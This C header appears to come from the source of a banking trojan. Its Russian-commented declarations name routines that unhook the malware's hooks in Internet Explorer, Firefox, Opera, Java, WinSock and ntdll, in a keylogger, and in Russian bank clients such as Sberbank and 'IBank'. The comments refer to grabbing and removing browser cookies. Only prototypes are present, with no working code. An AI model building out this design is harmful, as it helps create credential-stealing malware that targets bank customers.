#include <windows.h>


void UnhookDlls();
void UnhookNtDll();
void UnhookIE();
void UnhookFF();
void UnhookWSA();
void UnhookUser32();

/// Функции добавленные при добавлении RuBnk
//#ifdef RuBnkH
void UnhookTranslateMessage();
void UnhookCreateFileW();
void UnhookIBancShowCreate();
void UnhookShowWindow();
//#endif
// убираем хуки, необходимо для удаления кукисов из ие
void UnhookCookie();
// нестандартное решение по опере, все вкорне переделано, но суть та же снятие кукисов
void UnhookOpera(DWORD dwAddr);
// java
void UnhookJava();
void UnhookGetMessagePos();
void UnhookKeyLogger();
void UnhookSber();